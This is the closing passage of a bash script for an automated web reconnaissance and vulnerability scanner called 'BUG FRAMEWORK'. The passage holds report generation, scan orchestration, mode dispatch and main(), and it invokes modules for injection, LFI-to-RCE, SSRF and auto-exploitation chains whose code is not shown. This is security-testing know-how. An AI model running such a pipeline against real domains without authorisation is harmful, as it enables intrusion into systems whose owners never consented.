    progress "MODULE 22 — Report Generation"
    log_section "MODULE 22 — HTML + MARKDOWN REPORT"
    local R="$WORKSPACE/reports"
    mkdir -p "$R" 2>/dev/null || true
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    local dur=$(( ($(date +%s) - START_TIME) / 60 ))

    # ── Counters per finding class ──
    local c_cmdi c_lfi_rce c_lfi c_ssrf c_sqli c_idor c_xss c_cors c_oauth c_takeover c_sens c_bac c_chain c_nuclei_hi
    c_cmdi=$(cnt "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt")
    c_lfi_rce=$(cnt "$WORKSPACE/vulns/lfi/lfi_rce.txt")
    c_lfi=$(cnt "$WORKSPACE/vulns/lfi/lfi_confirmed.txt")
    c_ssrf=$(cnt "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt")
    c_sqli=$(cnt "$WORKSPACE/vulns/sqli/sqli_findings.txt")
    c_idor=$(cnt "$WORKSPACE/vulns/idor/idor_seq_diff.txt")
    c_xss=$(cnt "$WORKSPACE/vulns/xss/dalfox_results.txt")
    c_cors=$(cnt "$WORKSPACE/vulns/cors/cors_confirmed.txt")
    c_oauth=$(cnt "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt")
    c_takeover=$(cnt "$WORKSPACE/vulns/exploit/takeover_verified.txt")
    [[ "$c_takeover" -eq 0 ]] && c_takeover=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_takeover.txt")
    c_sens=$(cnt "$WORKSPACE/vulns/misconfig/sensitive_files.txt")
    c_bac=$(cnt "$WORKSPACE/classified/bac/bac_confirmed.txt")
    c_chain=$(cnt "$WORKSPACE/vulns/exploit/chain_confirmed.txt")
    c_nuclei_hi=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt")

    local crit=$(( c_cmdi + c_lfi_rce + c_ssrf + c_chain ))
    local high=$(( c_idor + c_cors + c_xss + c_bac + c_takeover + c_nuclei_hi ))
    local med=$(( c_lfi + c_oauth + c_sens ))
    local info=$(( c_sqli ))

    # ── Markdown ──
    local MD="$R/report.md"
    {
        echo "# BUG FRAMEWORK v$VERSION — Security Assessment Report"
        echo ""
        echo "**Target:** \`$DOMAIN\`  "
        echo "**Date:** $ts  "
        echo "**Duration:** ${dur} min  "
        echo "**Mode:** $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)  "
        echo "**Auth:** $(if [[ -n "$SESSION_COOKIE" ]]; then echo Authenticated; else echo Unauthenticated; fi)"
        echo ""
        echo "## Summary"
        echo ""
        echo "| Severity | Count |"
        echo "|----------|-------|"
        echo "| 🔴 Critical | $crit |"
        echo "| 🟠 High     | $high |"
        echo "| 🟡 Medium   | $med |"
        echo "| 🔵 Info     | $info |"
        echo ""
        echo "## Auto-Exploitation Chain"
        echo ""
        if [[ "$c_chain" -gt 0 ]]; then
            echo "**⚠️  $c_chain exploitable primitives chain-confirmed**"
            echo ""
            echo '```'
            cat "$WORKSPACE/vulns/exploit/chain_confirmed.txt" 2>/dev/null
            echo '```'
        else
            echo "No chain-confirmed exploits. Findings below remain candidates requiring manual validation."
        fi
        echo ""
        echo "## Findings Detail"
        echo ""
        _report_md_section "Command Injection (CMDi)"      "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"          "$c_cmdi"    "Critical"
        _report_md_section "LFI → RCE (log poison)"        "$WORKSPACE/vulns/lfi/lfi_rce.txt"                  "$c_lfi_rce" "Critical"
        _report_md_section "SSRF (confirmed)"              "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"          "$c_ssrf"    "Critical"
        _report_md_section "SQL Injection (confirmed)"     "$WORKSPACE/vulns/sqli/sqli_findings.txt"           "$c_sqli"    "Critical"
        _report_md_section "IDOR (sequential diff)"        "$WORKSPACE/vulns/idor/idor_seq_diff.txt"           "$c_idor"    "High"
        _report_md_section "XSS (dalfox)"                  "$WORKSPACE/vulns/xss/dalfox_results.txt"           "$c_xss"     "High"
        _report_md_section "CORS (credentialed)"           "$WORKSPACE/vulns/cors/cors_confirmed.txt"          "$c_cors"    "High"
        _report_md_section "BAC (unauth admin access)"     "$WORKSPACE/classified/bac/bac_confirmed.txt"       "$c_bac"     "High"
        _report_md_section "Subdomain Takeover"            "$WORKSPACE/vulns/exploit/takeover_verified.txt"    "$c_takeover" "High"
        _report_md_section "Nuclei Critical/High"          "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt"  "$c_nuclei_hi" "High"
        _report_md_section "LFI (confirmed reads)"         "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"            "$c_lfi"     "Medium"
        _report_md_section "OAuth redirect_uri open"       "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt"     "$c_oauth"   "Medium"
        _report_md_section "Sensitive Files Exposed"       "$WORKSPACE/vulns/misconfig/sensitive_files.txt"    "$c_sens"    "Medium"
        echo ""
        echo "## Scope & Methodology"
        echo ""
        echo "- Subdomain enum: subfinder, crt.sh, assetfinder, urlscan, amass, alterx"
        echo "- Probing: httpx (status/tech/CDN fingerprint)"
        echo "- URL collection: waybackurls, gau, waymore, urlscan, katana, hakrawler"
        echo "- JS analysis: endpoint mining, API routes, secret scanning"
        echo "- Detection: nuclei, dalfox, sqlmap, custom SSRF/LFI/CMDi/CSRF/CORS/IDOR engines"
        echo "- Auto-exploitation: Module 21 chain (verified primitives only)"
        echo ""
        echo "*Generated by BUG FRAMEWORK v$VERSION — authorized testing only*"
    } > "$MD"
    log_ok "Markdown report → $MD"

    # ── HTML ──
    local HTML="$R/report.html"
    {
        cat << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BUG FRAMEWORK Security Report</title>
<style>
:root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --crit:#f85149; --high:#d29922; --med:#58a6ff; --info:#3fb950; }
* { margin:0; padding:0; box-sizing:border-box; }
body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; padding:2rem; }
.wrap { max-width:1100px; margin:0 auto; }
h1 { color:#fff; font-size:1.8rem; margin-bottom:.2rem; }
h2 { color:#fff; margin:2rem 0 1rem; border-bottom:1px solid var(--border); padding-bottom:.5rem; }
.meta { color:#8b949e; font-size:.9rem; margin-bottom:2rem; }
.cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:1rem; margin:1.5rem 0; }
.card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1rem; }
.card .num { font-size:2rem; font-weight:700; }
.card .lbl { font-size:.8rem; color:#8b949e; text-transform:uppercase; letter-spacing:.05em; }
.crit .num { color:var(--crit); } .high .num { color:var(--high); } .med .num { color:var(--med); } .info .num { color:var(--info); }
table { width:100%; border-collapse:collapse; margin:1rem 0; background:var(--card); border-radius:8px; overflow:hidden; }
th { background:#21262d; text-align:left; padding:.6rem .8rem; font-size:.8rem; text-transform:uppercase; letter-spacing:.05em; color:#8b949e; }
td { padding:.6rem .8rem; border-top:1px solid var(--border); font-size:.85rem; word-break:break-all; font-family:ui-monospace,monospace; }
tr:hover td { background:#1c2128; }
.badge { display:inline-block; padding:.15rem .5rem; border-radius:4px; font-size:.7rem; font-weight:700; text-transform:uppercase; }
.b-crit { background:#3d1214; color:var(--crit); } .b-high { background:#3d2a0e; color:var(--high); }
.b-med { background:#0e243d; color:var(--med); } .b-info { background:#0f2e18; color:var(--info); }
pre { background:#0a0d12; border:1px solid var(--border); border-radius:8px; padding:1rem; overflow-x:auto; font-size:.8rem; max-height:400px; }
.muted { color:#8b949e; }
a { color:var(--med); }
</style>
</head>
<body>
<div class="wrap">
HTMLEOF
        echo "<h1>🐛 BUG FRAMEWORK v$VERSION — Security Assessment Report</h1>"
        echo "<div class='meta'><b>Target:</b> $DOMAIN &nbsp;|&nbsp; <b>Date:</b> $ts &nbsp;|&nbsp; <b>Duration:</b> ${dur} min &nbsp;|&nbsp; <b>Mode:</b> $(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi) &nbsp;|&nbsp; <b>Auth:</b> $(if [[ -n "$SESSION_COOKIE" ]]; then echo Authenticated; else echo Unauthenticated; fi)</div>"
        echo "<h2>Summary</h2>"
        echo "<div class='cards'>"
        echo "<div class='card crit'><div class='num'>$crit</div><div class='lbl'>Critical</div></div>"
        echo "<div class='card high'><div class='num'>$high</div><div class='lbl'>High</div></div>"
        echo "<div class='card med'><div class='num'>$med</div><div class='lbl'>Medium</div></div>"
        echo "<div class='card info'><div class='num'>$info</div><div class='lbl'>Info</div></div>"
        echo "</div>"
        echo "<h2>⚡ Auto-Exploitation Chain</h2>"
        if [[ "$c_chain" -gt 0 ]]; then
            echo "<p class='muted'>$c_chain exploitable primitives chain-confirmed. Artifacts: <code>$WORKSPACE/vulns/exploit/</code></p>"
            echo "<pre>$(cat "$WORKSPACE/vulns/exploit/chain_confirmed.txt" 2>/dev/null | html_esc)</pre>"
        else
            echo "<p class='muted'>No chain-confirmed exploits — findings require manual validation.</p>"
        fi
        echo "<h2>Findings Detail</h2>"
        _report_html_section "Command Injection (CMDi)"    "$WORKSPACE/vulns/cmdi/cmdi_confirmed.txt"        "$c_cmdi"    "crit"
        _report_html_section "LFI → RCE (log poison)"      "$WORKSPACE/vulns/lfi/lfi_rce.txt"                "$c_lfi_rce" "crit"
        _report_html_section "SSRF (confirmed)"            "$WORKSPACE/vulns/ssrf/ssrf_confirmed.txt"        "$c_ssrf"    "crit"
        _report_html_section "SQL Injection (confirmed)"   "$WORKSPACE/vulns/sqli/sqli_findings.txt"         "$c_sqli"    "crit"
        _report_html_section "IDOR (sequential diff)"      "$WORKSPACE/vulns/idor/idor_seq_diff.txt"         "$c_idor"    "high"
        _report_html_section "XSS (dalfox)"                "$WORKSPACE/vulns/xss/dalfox_results.txt"         "$c_xss"     "high"
        _report_html_section "CORS (credentialed)"         "$WORKSPACE/vulns/cors/cors_confirmed.txt"        "$c_cors"    "high"
        _report_html_section "BAC (unauth admin access)"   "$WORKSPACE/classified/bac/bac_confirmed.txt"     "$c_bac"     "high"
        _report_html_section "Subdomain Takeover"          "$WORKSPACE/vulns/exploit/takeover_verified.txt"  "$c_takeover" "high"
        _report_html_section "Nuclei Critical/High"        "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" "$c_nuclei_hi" "high"
        _report_html_section "LFI (confirmed reads)"       "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"          "$c_lfi"     "med"
        _report_html_section "OAuth redirect_uri open"     "$WORKSPACE/vulns/oauth/oauth_redirect_uri.txt"   "$c_oauth"   "med"
        _report_html_section "Sensitive Files Exposed"     "$WORKSPACE/vulns/misconfig/sensitive_files.txt"  "$c_sens"    "med"
        echo "<p class='muted' style='margin-top:3rem'>Generated by BUG FRAMEWORK v$VERSION — authorized testing only</p>"
        echo "</div></body></html>"
    } > "$HTML"
    log_ok "HTML report → $HTML"
}

_report_md_section() {
    local title="$1" file="$2" count="$3" sev="$4"
    echo "### $title — [$count] ($sev)"
    echo ""
    if [[ "$count" -gt 0 ]]; then
        echo '```'
        head -50 "$file" 2>/dev/null
        [[ "$count" -gt 50 ]] && echo "... ($(( count - 50 )) more)"
        echo '```'
    else
        echo "_None found._"
    fi
    echo ""
}

_report_html_section() {
    local title="$1" file="$2" count="$3" sev="$4"
    echo "<h3>${title} <span class='badge b-${sev}'>${count}</span></h3>"
    if [[ "$count" -gt 0 ]]; then
        echo "<table><thead><tr><th>Finding</th></tr></thead><tbody>"
        head -100 "$file" 2>/dev/null | while IFS= read -r l; do
            echo "<tr><td>$(html_esc "$l")</td></tr>"
        done
        echo "</tbody></table>"
        [[ "$count" -gt 100 ]] && echo "<p class='muted'>+ $(( count - 100 )) more in $file</p>"
    else
        echo "<p class='muted'>None found.</p>"
    fi
}

# ══════════════════════════════════════════════════════
# FULL SCAN ORCHESTRATOR
# ══════════════════════════════════════════════════════
run_full_scan() {
    setup_workspace

    if [[ "$M_EXPLOIT" == true ]]; then
        # -exploit alone: ensure minimal data, run chain only
        ensure_live; ensure_urls
        mod_exploit_chain
        mod_report
        return
    fi

    if [[ "$M_VULN" == true ]]; then
        # -vuln alone: detection only from existing recon
        ensure_live; ensure_urls
        run_mod "nuclei"   mod_nuclei
        run_mod "xss"      mod_xss
        run_mod "sqli"     mod_sqli
        run_mod "ssrf"     mod_ssrf
        run_mod "lfi"      mod_lfi
        run_mod "cmdi"     mod_cmdi
        run_mod "csrf"     mod_csrf
        run_mod "cors"     mod_cors
        run_mod "idor"     mod_idor
        run_mod "oauth"    mod_oauth
        run_mod "classify" mod_classify
        [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain
        run_mod "report"   mod_report
        return
    fi

    # ── FULL SCAN ──
    log_step "STARTING FULL SCAN — $DOMAIN (v$VERSION)"
    local SCAN_TOTAL=24

    run_mod "subdomains" mod_subdomains
    run_mod "httpx"      mod_httpx
    run_mod "urls"       mod_urls
    run_mod "js"         mod_js
    run_mod "waf"        mod_waf
    run_mod "api"        mod_api_schema
    run_mod "pmf"        mod_param_fuzz
    run_mod "paths"      mod_paths
    run_mod "ports"      mod_ports
    run_mod "exposure"   mod_exposure
    run_mod "nuclei"     mod_nuclei
    run_mod "xss"        mod_xss
    run_mod "sqli"       mod_sqli
    run_mod "ssrf"       mod_ssrf
    run_mod "lfi"        mod_lfi
    run_mod "cmdi"       mod_cmdi
    run_mod "csrf"       mod_csrf
    run_mod "cors"       mod_cors
    run_mod "idor"       mod_idor
    run_mod "oauth"      mod_oauth
    run_mod "tech"       mod_tech
    run_mod "screens"    mod_screenshots
    run_mod "classify"   mod_classify
    [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain
    run_mod "dedupe"     dedupe_workspace
    run_mod "report"     mod_report

    final_summary
}

# ── Single-mode dispatch ──
run_single_mode() {
    local m="$1"
    case "$m" in
        sub)   ensure_live; run_mod "subdomains" mod_subdomains; run_mod "httpx" mod_httpx ;;
        one)   setup_workspace; mod_httpx; mod_urls; mod_js ;;
        url)   ensure_live; run_mod "urls" mod_urls; run_mod "js" mod_js ;;
        we)    ensure_live; run_mod "urls" mod_urls; run_mod "js" mod_js; run_mod "paths" mod_paths ;;
        js)    ensure_live; ensure_urls; run_mod "js" mod_js ;;
        fuzz)  ensure_live; run_mod "paths" mod_paths ;;
        ports) ensure_live; run_mod "ports" mod_ports ;;
        vuln)  ensure_live; ensure_urls; run_mod "nuclei" mod_nuclei; run_mod "xss" mod_xss; run_mod "sqli" mod_sqli; run_mod "ssrf" mod_ssrf; run_mod "lfi" mod_lfi; run_mod "cmdi" mod_cmdi; run_mod "csrf" mod_csrf; run_mod "cors" mod_cors; run_mod "idor" mod_idor; run_mod "oauth" mod_oauth; run_mod "classify" mod_classify; [[ "$F_NO_EXPLOIT" == false ]] && run_mod "exploit" mod_exploit_chain; run_mod "report" mod_report ;;
        exploit) ensure_live; ensure_urls; run_mod "exploit" mod_exploit_chain; run_mod "report" mod_report ;;
        nuclei) ensure_live; run_mod "nuclei" mod_nuclei; run_mod "report" mod_report ;;
        xss)   ensure_live; ensure_urls; run_mod "xss" mod_xss ;;
        sqli)  ensure_live; ensure_urls; run_mod "sqli" mod_sqli ;;
        ssrf)  ensure_live; ensure_urls; run_mod "ssrf" mod_ssrf ;;
        lfi)   ensure_live; ensure_urls; run_mod "lfi" mod_lfi ;;
        csrf)  ensure_live; ensure_urls; run_mod "csrf" mod_csrf; run_mod "cors" mod_cors ;;
        cors)  ensure_live; ensure_urls; run_mod "cors" mod_cors ;;
        idor)  ensure_live; ensure_urls; run_mod "classify" mod_classify; run_mod "idor" mod_idor ;;
        oauth) ensure_live; ensure_urls; run_mod "oauth" mod_oauth ;;
        tech)  ensure_live; run_mod "tech" mod_tech ;;
        waf)   ensure_live; run_mod "waf" mod_waf ;;
        api)   ensure_live; run_mod "api" mod_api_schema ;;
        pmf)   ensure_live; ensure_urls; run_mod "pmf" mod_param_fuzz ;;
        report) setup_workspace; run_mod "report" mod_report ;;
        *)     show_help ;;
    esac
}

# ── Scope file mode ──
run_scope_scan() {
    [[ -f "$SCOPE_FILE" ]] || { log_err "Scope file not found: $SCOPE_FILE"; exit 1; }
    log_step "SCOPE SCAN — $(cnt "$SCOPE_FILE") targets from $SCOPE_FILE"
    while IFS= read -r line; do
        [[ -z "$line" || "$line" == \#* ]] && continue
        DOMAIN=$(echo "$line" | sed 's|https\?://||g' | sed 's|/$||g' | awk '{print $1}')
        [[ -z "$DOMAIN" ]] && continue
        log_hit "=== SCOPED TARGET: $DOMAIN ==="
        run_full_scan
    done < "$SCOPE_FILE"
}

# ══════════════════════════════════════════════════════
# FINAL SUMMARY
# ══════════════════════════════════════════════════════
final_summary() {
    local elapsed=$(( ($(date +%s) - START_TIME) / 60 ))
    local V="$WORKSPACE/vulns"
    local tot
    tot=$(cat \
        "$V/cmdi/cmdi_confirmed.txt" \
        "$V/lfi/lfi_confirmed.txt" \
        "$V/lfi/lfi_rce.txt" \
        "$V/ssrf/ssrf_confirmed.txt" \
        "$V/sqli/sqli_findings.txt" \
        "$V/idor/idor_seq_diff.txt" \
        "$V/xss/dalfox_results.txt" \
        "$V/cors/cors_confirmed.txt" \
        "$V/exploit/chain_confirmed.txt" \
        "$WORKSPACE/classified/bac/bac_confirmed.txt" \
        "$WORKSPACE/vulns/misconfig/sensitive_files.txt" \
        2>/dev/null | wc -l)

    echo ""
    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "  ${BOLD}${WHITE}║  ${MAGENTA}FINAL SUMMARY${NC}${BOLD}${WHITE}                                      ║${NC}"
    echo -e "  ${BOLD}${WHITE}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${BOLD}${WHITE}║${NC}  Target        : ${CYAN}${DOMAIN}${NC}"
    echo -e "  ${BOLD}${WHITE}║${NC}  Duration      : ${YELLOW}${elapsed} min${NC}"
    echo -e "  ${BOLD}${WHITE}║${NC}  Workspace     : ${DIM}${WORKSPACE}${NC}"
    echo -e "  ${BOLD}${WHITE}║${NC}  Total findings: ${RED}${tot}${NC}"
    echo -e "  ${BOLD}${WHITE}║${NC}  Reports       : ${GREEN}${WORKSPACE}/reports/report.html${NC}"
    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════════════════╝${NC}"

    echo ""
    echo -e "  ${BOLD}${YELLOW}┌─ FINDING BREAKDOWN ──────────────────────────────────────────────┐${NC}"
    [[ -s "$V/exploit/chain_confirmed.txt" ]] && echo -e "  ${SYM_BUG} ${BOLD}${RED}Exploited/Chain-confirmed : $(cnt "$V/exploit/chain_confirmed.txt")${NC}"
    [[ -s "$V/cmdi/cmdi_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} CMDi confirmed            : $(cnt "$V/cmdi/cmdi_confirmed.txt")"
    [[ -s "$V/lfi/lfi_rce.txt" ]]          && echo -e "  ${SYM_BUG} LFI→RCE                   : $(cnt "$V/lfi/lfi_rce.txt")"
    [[ -s "$V/lfi/lfi_confirmed.txt" ]]    && echo -e "  ${SYM_BUG} LFI confirmed             : $(cnt "$V/lfi/lfi_confirmed.txt")"
    [[ -s "$V/ssrf/ssrf_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} SSRF confirmed            : $(cnt "$V/ssrf/ssrf_confirmed.txt")"
    [[ -s "$V/sqli/sqli_findings.txt" ]]   && echo -e "  ${SYM_BUG} SQLi confirmed            : $(cnt "$V/sqli/sqli_findings.txt")"
    [[ -s "$V/idor/idor_seq_diff.txt" ]]   && echo -e "  ${SYM_BUG} IDOR candidates           : $(cnt "$V/idor/idor_seq_diff.txt")"
    [[ -s "$V/xss/dalfox_results.txt" ]]   && echo -e "  ${SYM_BUG} XSS hits                  : $(cnt "$V/xss/dalfox_results.txt")"
    [[ -s "$V/cors/cors_confirmed.txt" ]]  && echo -e "  ${SYM_BUG} CORS credentialed          : $(cnt "$V/cors/cors_confirmed.txt")"
    [[ -s "$WORKSPACE/classified/bac/bac_confirmed.txt" ]] && echo -e "  ${SYM_BUG} BAC unauth access         : $(cnt "$WORKSPACE/classified/bac/bac_confirmed.txt")"
    [[ -s "$V/misconfig/sensitive_files.txt" ]] && echo -e "  ${SYM_BUG} Sensitive files exposed    : $(cnt "$V/misconfig/sensitive_files.txt")"
    [[ -s "$V/nuclei/nuclei_critical_high.txt" ]] && echo -e "  ${SYM_BUG} Nuclei critical/high       : $(cnt "$V/nuclei/nuclei_critical_high.txt")"
    echo -e "  ${BOLD}${YELLOW}└──────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "  ${GREEN}Scan complete. Open the report:${NC} ${BOLD}${WORKSPACE}/reports/report.html${NC}"
    echo ""
}

# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════
main() {
    parse_args "$@"

    if [[ "$F_INSTALL" == true ]]; then
        install_tools
        exit 0
    fi
    if [[ "$F_UPDATE_NUCLEI" == true ]]; then
        nuclei -update-templates -silent && log_ok "Nuclei templates updated"
        exit 0
    fi
    if [[ -z "$DOMAIN" && -z "$SCOPE_FILE" ]]; then
        log_err "No target specified. Use -d <domain> or -scope <file>"
        show_help
    fi

    # export helper PATHs for tools installed to ~/go/bin
    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin"

    print_banner

    # Preflight: required binaries (warn once, continue)
    local REQUIRED=(curl jq python3 subfinder httpx nuclei katana ffuf gf waybackurls gau dnsx)
    local missing=0
    for bin in "${REQUIRED[@]}"; do
        has "$bin" || { log_warn "Missing tool: $bin (run: bug --install)"; missing=1; }
    done
    [[ "$missing" -eq 1 ]] && echo ""

    if [[ "$M_SCOPE" == true ]]; then
        run_scope_scan
        exit 0
    fi

    # Select mode
    if [[ "$M_SUB" == true ]]; then
        run_single_mode "sub"
    elif [[ "$M_ONE" == true ]]; then
        run_single_mode "one"
    elif [[ "$M_URL" == true ]]; then
        run_single_mode "url"
    elif [[ "$M_WE" == true ]]; then
        run_single_mode "we"
    elif [[ "$M_JS" == true ]]; then
        run_single_mode "js"
    elif [[ "$M_FUZZ" == true ]]; then
        run_single_mode "fuzz"
    elif [[ "$M_PORTS" == true ]]; then
        run_single_mode "ports"
    elif [[ "$M_VULN" == true ]]; then
        run_single_mode "vuln"
    elif [[ "$M_EXPLOIT" == true ]]; then
        run_single_mode "exploit"
    elif [[ "$M_NUCLEI_ONLY" == true ]]; then
        run_single_mode "nuclei"
    elif [[ "$M_XSS" == true ]]; then
        run_single_mode "xss"
    elif [[ "$M_SQLI" == true ]]; then
        run_single_mode "sqli"
    elif [[ "$M_SSRF" == true ]]; then
        run_single_mode "ssrf"
    elif [[ "$M_LFI" == true ]]; then
        run_single_mode "lfi"
    elif [[ "$M_CSRF" == true ]]; then
        run_single_mode "csrf"
    elif [[ "$M_CORS" == true ]]; then
        run_single_mode "cors"
    elif [[ "$M_IDOR" == true ]]; then
        run_single_mode "idor"
    elif [[ "$M_OAUTH" == true ]]; then
        run_single_mode "oauth"
    elif [[ "$M_TECH" == true ]]; then
        run_single_mode "tech"
    elif [[ "$M_WAF" == true ]]; then
        run_single_mode "waf"
    elif [[ "$M_API" == true ]]; then
        run_single_mode "api"
    elif [[ "$M_PMF" == true ]]; then
        run_single_mode "pmf"
    elif [[ "$M_REPORT" == true ]]; then
        run_single_mode "report"
    else
        run_full_scan
    fi

    exit 0
}

main "$@"
